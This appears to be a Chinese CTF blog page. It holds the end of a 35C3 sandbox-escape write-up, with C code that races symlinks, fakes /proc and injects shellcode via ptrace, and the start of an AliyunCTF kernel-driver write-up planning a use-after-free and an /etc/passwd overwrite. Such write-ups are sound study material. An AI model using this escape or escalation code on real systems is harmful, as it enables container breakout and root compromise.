<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_recvfd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = setup_socket_and_recv_fd();</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Starting race&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (unlinkat(fd, <span class="string">&quot;../2&quot;</span>, AT_REMOVEDIR))</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    CHECK_CALL(symlinkat, <span class="string">&quot;/&quot;</span>, fd, <span class="string">&quot;../2&quot;</span>);</span><br><span class="line">    info(<span class="string">&quot;Race done&quot;</span>);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">setup_socket_and_recv_fd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> addrlen;</span><br><span class="line">    create_socket(&amp;sock, &amp;addr, &amp;addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Connecting&quot;</span>);</span><br><span class="line">    <span class="type">int</span> conn = CHECK_CALL(connect, sock, &amp;addr, addrlen);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = recv_fd(conn);</span><br><span class="line"></span><br><span class="line">    close(conn);</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">recv_fd</span><span class="params">(<span class="type">int</span> conn)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Preparing for receive&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> io_buf[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123;.iov_base = io_buf, .iov_len = <span class="keyword">sizeof</span> io_buf&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> buf[CMSG_SPACE(<span class="keyword">sizeof</span> fd)];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> <span class="title">align</span>;</span></span><br><span class="line">    &#125; u;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;u, <span class="number">0</span>, <span class="keyword">sizeof</span> u);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    msg.msg_iov = &amp;io;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    msg.msg_control = u.buf;</span><br><span class="line">    msg.msg_controllen = <span class="keyword">sizeof</span> u.buf;</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Receiving fd&quot;</span>);</span><br><span class="line">    CHECK_CALL(recvmsg, conn, &amp;msg, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Extracting fd&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span> =</span> CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsg), <span class="keyword">sizeof</span> fd);</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后便是最重要的逃逸部分代码，这里只放一些关键代码，首先先检测是否可以访问&#x2F;proc文件夹，也就是看一下是否逃逸成功到&#x2F;目录，之后创建子进程，并且通过set_trap_for_join来进行mnt操作，首先就是把proc放到一个新的目录下，并且创建一个新的&#x2F;proc目录，让新的&#x2F;proc&#x2F;父进程pid&#x2F;ns&#x2F;pid指向原来子进程的pid namespace，这样后面run_elf的时候就会和子进程一个pid namespace了，之后就是把uts namespace创建成fifo用来阻塞，提高成功率，之后就是不断的利用ptrace进行检测是否有新的进程加入，这里需要注意的是因为创建的是一个新进程，所以这里直接检测pid为2就可以了，之后注入shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_escalate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Checking that we won the race&quot;</span>);</span><br><span class="line">    CHECK_CALL(access, <span class="string">&quot;/proc&quot;</span>, F_OK);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> init = get_cur_pid();</span><br><span class="line">    info(<span class="string">&quot;Init pid: %d&quot;</span>, init);</span><br><span class="line">    </span><br><span class="line">    new_namespaces();</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Forking&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (CHECK_CALL(fork)) &#123;</span><br><span class="line">        info(<span class="string">&quot;Parent done&quot;</span>);</span><br><span class="line">        do_sleep();</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;Child started&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> child = get_cur_pid();</span><br><span class="line">    info(<span class="string">&quot;Child pid: %d&quot;</span>, child);</span><br><span class="line">    </span><br><span class="line">    set_trap_for_join(init, child);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Waiting for victim to join&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (ptrace(PTRACE_ATTACH, <span class="number">2</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;Attached to victim&quot;</span>);</span><br><span class="line">    CHECK_CALL(waitpid, <span class="number">2</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Reading rip&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    xptrace(PTRACE_GETREGS, <span class="number">2</span>, <span class="number">0</span>, (<span class="type">uintptr_t</span>)&amp;regs);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Writing shellcode to %p&quot;</span>, regs.rip);</span><br><span class="line">    <span class="type">uint8_t</span> shellcode[] = &#123;SHELLCODE&#125;;</span><br><span class="line">    ptrace_write(<span class="number">2</span>, regs.rip, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Detaching&quot;</span>);</span><br><span class="line">    xptrace(PTRACE_DETACH, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Opening fifo&quot;</span>);</span><br><span class="line">    DECL_STR(fifo, <span class="string">&quot;/proc/%d/ns/uts&quot;</span>, init)</span><br><span class="line">    CHECK_CALL(open, fifo, O_WRONLY);</span><br><span class="line">    </span><br><span class="line">    do_sleep();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_trap_for_join</span><span class="params">(<span class="type">int</span> init_pid, <span class="type">int</span> child_pid)</span> &#123;</span><br><span class="line">    makedir(<span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND));</span><br><span class="line">    bindmount(<span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND));</span><br><span class="line">    makedir(<span class="string">&quot;/tmp/newproc_&quot;</span> STR(RAND));</span><br><span class="line">    bindmount(<span class="string">&quot;/tmp/newproc_&quot;</span> STR(RAND), <span class="string">&quot;/proc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DECL_STR(dir1, <span class="string">&quot;/proc/%d&quot;</span>, init_pid)</span><br><span class="line">    makedir(dir1);</span><br><span class="line">    DECL_STR(dir2, <span class="string">&quot;/proc/%d/ns&quot;</span>, init_pid)</span><br><span class="line">    makedir(dir2);</span><br><span class="line"></span><br><span class="line">    DECL_STR(linkpath, <span class="string">&quot;/proc/%d/ns/pid&quot;</span>, init_pid)</span><br><span class="line">    DECL_STR(target, <span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND) <span class="string">&quot;/%d/ns/pid&quot;</span>, child_pid)</span><br><span class="line">    info(<span class="string">&quot;Linking pid ns \&quot;%s\&quot; -&gt; \&quot;%s\&quot;&quot;</span>, linkpath, target);</span><br><span class="line">    CHECK_CALL(symlink, target, linkpath);</span><br><span class="line"></span><br><span class="line">    DECL_STR(fifo, <span class="string">&quot;/proc/%d/ns/uts&quot;</span>, init_pid)</span><br><span class="line">    info(<span class="string">&quot;Creating fifo \&quot;%s\&quot;&quot;</span>, fifo);</span><br><span class="line">    CHECK_CALL(mkfifo, fifo, <span class="number">0755</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	自此代码的逻辑就分析完了，这里贴一下简单的执行流程，根据这个流程执行最终就会把sandbox2的进程读取flag并且输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting sandbox: sleep</span><br><span class="line">[+] Starting sandbox: sleep</span><br><span class="line">[+] Running in sandbox #0: sendfd</span><br><span class="line">[+] Running in sandbox #1: recvfd</span><br><span class="line">[+] Starting sandbox: escalate</span><br><span class="line">[+] Running in sandbox #2: sleep</span><br></pre></td></tr></table></figure>

<p>​	由于篇幅原因，需要exp的可以直接访问<a target="_blank" rel="noopener" href="https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces">链接</a>来进行获取</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	由于这个是我复现的容器逃逸的第一个题目，其中很多思想之前并没有接触过，因此复现的过程也比较详细，中间也踩过不少的坑，通过这个文章可以很清楚的复现对应赛题，感觉通过这个题目对于容器有了进一步的了解，希望可以通过后面的学习不断的加深对于容器以及docker原理的学习和漏洞复现</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/AliyunCTF--Alimem/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/02/07/AliyunCTF--Alimem/" class="post-title-link" itemprop="url">AliyunCTF--Alimem</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2026-02-07 09:50:00 / Modified: 10:07:58" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/recurrence/" itemprop="url" rel="index"><span itemprop="name">recurrence</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AliyunCTF–Alimem"><a href="#AliyunCTF–Alimem" class="headerlink" title="AliyunCTF–Alimem"></a>AliyunCTF–Alimem</h1><h1 id="一-背景介绍"><a href="#一-背景介绍" class="headerlink" title="一. 背景介绍"></a>一. 背景介绍</h1><p>​	本题主要是通过实现了一个misc设备来实现一个简单的内存管理模块，支持增删查改以及mmap的回调函数，通过对于本题的学习了解如何注册一个Misc设备并且通过vma_area_struct实现虚拟内存的实现，最终利用多线程竞争的漏洞，实现对于内核页的uaf，利用splice函数将只读的&#x2F;etc&#x2F;passwd覆盖，实现提权的思路。</p>
<h3 id="1-1-splice函数"><a href="#1-1-splice函数" class="headerlink" title="1.1 splice函数"></a>1.1 splice函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">loff_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">               <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>

<p>​	当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，具有可观的开销，因此为了减少这样的开销， splice这一个非常独特的系统调用应运而生，其作用是在文件与管道之间进行数据拷贝，以此将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销。</p>
<p>​	因此如果我们存在一个UAF可以控制pipe_buffer结构体，可以清除flags字段的只读，就可以通过利用管道的读写，实现对于内核中只读的文件进行覆盖，这里的思路借鉴了CVE-2022-0847 dirty pipe的思想，利用这个办法可以避免传统覆盖pipe_buf_operations的方法，可以减少对于内核基地址的泄露，直接覆盖&#x2F;etc&#x2F;passwd实现提权思想。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-struct-page结构体"><a href="#1-2-struct-page结构体" class="headerlink" title="1.2 struct page结构体"></a>1.2 struct page结构体</h3><ul>
<li>virt_to_page() 返回与虚拟地址关联的页面</li>
<li>pfn_to_page() 返回与页面帧号关联的页面</li>
<li>page_to_pfn() 返回与 struct page 关联的页面帧号</li>
<li>page_address() 返回 struct page 的虚拟地址；此函数只能用于 lowmem 中的页面</li>
<li>kmap() 为任意物理页面（可以来自 highmem）在内核中创建映射，并返回虚拟地址，该虚拟地址可用于直接引用该页面</li>
</ul>
<h3 id="1-3-vm-area-struct结构体"><a href="#1-3-vm-area-struct结构体" class="headerlink" title="1.3 vm_area_struct结构体"></a>1.3 vm_area_struct结构体</h3><p>​	它表示的是一块连续的虚拟地址空间区域，给进程使用的，地址空间范围是0~3G，对应的物理页面都可以是不连续的。</p>
<p><img src="/images/alimem/1741167424394.jpg" alt="1741167424394"></p>
<ul>
<li><p>vm_start 以及 vm_end ——内存区域的起始和结束地址（这些字段也出现在 &#x2F;proc&#x2F;<pid>&#x2F;maps 中）；</p>
</li>
<li><p>vm_file ——关联 file 结构的指针（如果有的话）；</p>
</li>
<li><p>vm_pgoff ——区域在文件中的偏移量；</p>
</li>
<li><p>vm_flags ——一组标志；</p>
</li>
<li><p>vm_ops ——该区域的工作函数集合；</p>
</li>
<li><p>vm_next 以及 vm_prev ——同一进程的区域通过链表结构连接起来。</p>
<p>对于驱动实现mmap回调函数来说，主要的作用就是讲设备的物理地址和要分配的虚拟地址进行映射，也就就是利用remap_pfn_range() 将连续的物理地址空间映射到由 vm_area_struct 表示的虚拟空间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remap_pfn_range</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma, <span class="type">unsigned</span> <span class="type">long</span> addr,</span></span><br><span class="line"><span class="params">                    <span class="type">unsigned</span> <span class="type">long</span> pfn, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">pgprot_t</span> prot)</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="二-漏洞产生原因"><a href="#二-漏洞产生原因" class="headerlink" title="二. 漏洞产生原因"></a>二. 漏洞产生原因</h1><h3 id="2-1-alimem-mmap函数"><a href="#2-1-alimem-mmap函数" class="headerlink" title="2.1 alimem_mmap函数"></a>2.1 alimem_mmap函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alimem_mmap</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx = vma-&gt;vm_pgoff;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= MAX_PAGES) <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_end - vma-&gt;vm_start != PAGE_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    <span class="keyword">if</span>(!pages[idx]) &#123;</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    page = rcu_dereference(pages[idx]);</span><br><span class="line">    <span class="keyword">if</span> (page) &#123;</span><br><span class="line">        <span class="type">phys_addr_t</span> phys = page-&gt;phys;</span><br><span class="line">        vma-&gt;vm_ops = &amp;alimem_vm_ops;</span><br><span class="line">        vma-&gt;vm_private_data = page;</span><br><span class="line">        vm_flags_set(vma, vma-&gt;vm_flags | VM_DONTEXPAND | VM_DONTDUMP);</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">if</span> (remap_pfn_range(vma, vma-&gt;vm_start, </span><br><span class="line">                          phys &gt;&gt; PAGE_SHIFT,</span><br><span class="line">                          vma-&gt;vm_end - vma-&gt;vm_start,</span><br><span class="line">                          vma-&gt;vm_page_prot)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">atomic_inc</span>(&amp;page-&gt;refcount);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	该 alimem_mmap 函数是 Linux 设备驱动中实现内存映射的核心机制，其通过参数校验（检查用户指定的内存页索引是否合法及映射长度是否符合单页要求）、RCU 保护下的内存页查找（确保访问全局数组时的线程安全）、虚拟内存区域配置（设置自定义的 vm_ops 操作集并将 alimem_page 关联到 vm_private_data 以提供操作上下文）、物理内存映射（利用 remap_pfn_range 将内核物理页转换为用户虚拟地址）以及引用计数管理（通过原子操作确保内存页生命周期安全），构建了用户空间直接访问内核物理内存的通道。这种设计实现了<strong>零拷贝</strong>机制，用户程序可通过指针直接操作设备内存，避免了传统 read&#x2F;write 系统调用在用户态与内核态间的数据复制开销。</p>
<p>​	但是在设计中存在一个漏洞首先线通过rcu_dereference获得到了page的一个引用，之后在对其进行处理操作之后对于refcount进行增加。这就给到了多线程竞争的时间。</p>
<h3 id="2-2-ioctl函数"><a href="#2-2-ioctl函数" class="headerlink" title="2.2 ioctl函数"></a>2.2 ioctl函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">alimem_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx, ret = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">new_page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> ALIMEM_ALLOC: &#123;</span><br><span class="line">        new_page = kzalloc(<span class="keyword">sizeof</span>(*new_page), GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!new_page) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    </span><br><span class="line">        new_page-&gt;virt = (<span class="type">void</span> *)__get_free_pages(GFP_KERNEL, PAGE_ORDER);</span><br><span class="line">        <span class="keyword">if</span> (!new_page-&gt;virt) &#123;</span><br><span class="line">            kfree(new_page);</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        new_page-&gt;phys = virt_to_phys(new_page-&gt;virt);</span><br><span class="line">        <span class="type">atomic_set</span>(&amp;new_page-&gt;refcount, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">        down_write(&amp;pages_lock);</span><br><span class="line">        <span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; MAX_PAGES; idx++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!pages[idx]) &#123;</span><br><span class="line">                rcu_assign_pointer(pages[idx], new_page);</span><br><span class="line">                up_write(&amp;pages_lock);</span><br><span class="line">                <span class="keyword">return</span> idx;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        up_write(&amp;pages_lock);</span><br><span class="line">        free_pages((<span class="type">unsigned</span> <span class="type">long</span>)new_page-&gt;virt, PAGE_ORDER);</span><br><span 